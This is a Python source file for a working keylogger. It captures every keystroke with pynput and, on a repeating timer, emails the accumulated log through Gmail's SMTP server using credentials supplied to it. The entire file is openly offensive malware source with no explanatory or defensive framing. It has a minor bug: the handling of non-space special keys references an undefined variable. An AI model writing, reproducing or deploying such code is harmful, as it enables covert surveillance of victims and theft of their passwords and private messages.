#!/usr/bin/env python3
import smtplib

import pynput.keyboard
import threading


class Keylogger:
    def __init__(self,time_interval,email,password):
        self.log = "Keylogger started: "
        self.time_interval=time_interval
        self.email=email
        self.password=password

    def append_to_log(self, string):
        self.log += string

    def process_key_press(self, key):

        try:
            # get key as char
            current_key = str(key.char)
        except AttributeError:
            # get key.space as " "
            if key == key.space:
                current_key = " "

            else:

                current_key += " " + str(key) + " "
        self.append_to_log(current_key)

    def report(self):

        # print(self.log)
        # reset log
        self.send_mail(self.email,self.password,"\n\n"+self.log)
        self.log = ""
        # send report periodically
        # use thread to not block comm
        timer = threading.Timer(self.time_interval, self.report)
        timer.start()

    def send_mail(self,email, password, msg):
        # using google public mail server
        server = smtplib.SMTP("smtp.gmail.com", 587)
        server.starttls()
        server.login(email, password)
        server.sendmail(email, email, msg)
        server.quit()

    def start(self):
        keyword_listener = pynput.keyboard.Listener(on_press=self.process_key_press)
        with keyword_listener:
            self.report()
            keyword_listener.join()
